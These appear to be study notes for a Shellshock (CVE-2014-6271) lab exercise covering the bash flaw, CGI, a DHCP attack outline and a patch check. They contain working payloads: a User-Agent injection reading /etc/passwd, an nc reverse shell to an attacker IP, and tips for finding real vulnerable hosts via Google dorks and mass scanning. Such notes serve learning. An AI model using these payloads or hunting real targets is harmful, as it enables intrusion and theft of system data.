
# CVE-2014-6271/Shellshock

* This exercise covers the exploitation of a Bash vulnerability through a __CGI__ .

* On most of the online exercises, you will not be able to get a reverse shell as exercises are firewalled-off.

* You can just run the command instead of the reverse shell

* You can access this exercise using the following URL: [`http://ptl-4f565d5a-5b0a9c6e.libcurl.so/`](http://ptl-4f565d5a-5b0a9c6e.libcurl.so/) . You can also use the TLS version if you're experiencing timeouts due to network filtering: [`https://ptl-4f565d5a-5b0a9c6e.libcurl.so/`](https://ptl-4f565d5a-5b0a9c6e.libcurl.so/) .

## Shellshock

* __GNU Bash__ through __4.3__ processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving 

	* the __ForceCommand__ feature in OpenSSH sshd, 

	* the `mod_cgi` and `mod_cgid` modules in the Apache HTTP Server, 

	* scripts executed by unspecified `DHCP` clients, 

	* and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka __ShellShock__." 

* `$ env val='(){ :;}; echo Unexpected_command' bash -c "echo Real_command"`
* `Unexpected_command`
* `Real_command`

* Apache also has a module called `mod_cgi` which handles the execution of Common Gateway Interface (CGI) scripts.

* `CGI` is a `protocol` designed to allow web servers to execute console-like programs directly on the server. 

* These programs, known as CGI scripts, often handle data from dynamic webpages and interact over HTTP. 

* A new directory, typically named `cgi-bin` or something similar, has to be designated to enable CGI scripts to run. When a browser requests the URL of a specific file contained within the CGI directory, the server runs the script, and the output is passed back to the browser.

* For a successful attack to occur, an attacker needs to force an application to send a malicious environment variable to Bash.

* When CGI scripts are run, specific information is copied to the environment variables.

* That information will subsequently be passed to `Bash` if it is called, thus providing a way for an attacker to inject malicious code. 

* For this exploit to work, there needs to be an executable script located in the `/cgi-bin` directory. 
```
#! /bin/bash
echo "Content-type: text/html"
echo ""
echo "Hello world!"
```

* In `User-Agent:` header you can pass `(){:;}; echo $(</etc/passwd)`. This creates the following variable inside a web server:

	* `HTTP_USER_AGENT=(){ :; }; echo $(</etc/passwd)`

* bash has special rules for handling a variable starting with `() { :; };`. Rather than treating the variable `HTTP_USER_AGENT` as a sequence of characters with no special meaning, bash will interpret it as a command that needs to be executed.

* You can gain reverse shell with payload `(){:;}; /usr/bin/nc <ip addr> 1234 -e /bin/bash`
* on you machine `$ nc -lvp 1234` 

* The solution is to upgrade bash to a version that doesn't interpret `() { :; };` in a special way.

* If `env xx='() { echo vulnerable; }' bash -c xx` shows `vulnerable`, you're still vulnerable. That is the only test that is relevant (whether the bash parser is still exposed to code in any environment variable).

* Read more about it [`here`](https://unix.stackexchange.com/questions/157381/when-was-the-shellshock-cve-2014-6271-7169-bug-introduced-and-what-is-the-pat/157495#157495)


## Shellshock RCE via malicious DHCP server

### Attacker Requirements

* Set up fake accesss point

* set up rogue DHCP server

* set `additional Option` to `114` or any option supporting a string and fill in the necessary payload(` (){ignored;};echo 'foo' `)

### Victim Requirements

* connect to fake access point with vulnerable dhcp  client software (which is using bash)

# Links

* [`https://www.owasp.org/images/1/1b/Shellshock_-_Tudor_Enache.pdf`](https://www.owasp.org/images/1/1b/Shellshock_-_Tudor_Enache.pdf)

## Very easy to find targets via:

* Google hacking (ie: `filetype:cgi inurl:cgi-bin site:.ro`) 

* Mass port scanning

* Namp shellshock script

* Available online scanners

* Metasploit module

# Extra

* `tty` originally meant `teletype` and `pty` means `pseudo-teletype`.

* In UNIX, `/dev/tty*` is any device that acts like a `teletype`, ie, a terminal. (Called teletype because that's what we had for terminals in those benighted days.)

* A `pty` is a `pseudotty`, a device entry that acts like a terminal to the process reading and writing there, but is managed by something else. They first appeared (as I recall) for `X Window` and screen and the like, where you needed something that acted like a terminal but could be used from another program.